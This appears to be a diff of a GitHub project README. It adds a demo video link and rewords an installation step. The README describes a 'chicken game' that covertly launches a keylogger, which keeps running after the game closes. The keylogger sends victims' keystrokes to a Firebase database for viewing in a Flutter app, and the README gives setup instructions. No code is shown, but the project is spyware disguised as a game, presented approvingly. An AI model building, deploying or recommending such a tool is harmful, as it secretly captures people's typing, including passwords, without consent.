@@ -23,6 +23,10 @@ This Project doesn't actually solve any problem but probably creates tonnes. A s
 A chicken game runs in the foreground,with its own fun elements. While another subprocess calls the keylogger.The chicken game includes a chicken which runs across the game window .The player is supposed to catch the chicken by clicking on it. The keylogger runs even if you close the chicken game, the keylogger runs in the background listening to their key strokes. The keystrokes are then send to firebase database .The flutter app connected with firebase can then list out their typing history for you.😎
 ### Video Demo
 
+
+https://github.com/user-attachments/assets/b7abdb14-9db7-4b27-a14f-a56dbe103342
+
+
 ## Technical Details
 ### Technologies/Components Used
 For Software:
@@ -45,7 +49,7 @@ For Software:
  
 # Installation
  1. First, create a [firebase project](https://support.google.com/appsheet/answer/10104995?hl=en) named "keylogger".
- 2. Next, download the project credential and add to the keylogger "servicefake.py".
+ 2. Next, download the project credential and add to the keylogger python program in python folder "servicefake.py".
  3. create a [firestore database](https://firebase.google.com/docs/firestore/quickstart).
  4. The flutter application is in the logger folder. 
  5. Use terminal to connect firebase to [flutter](https://firebase.google.com/docs/flutter/setup?platform=ios).you don't have to edit the flutter  code.
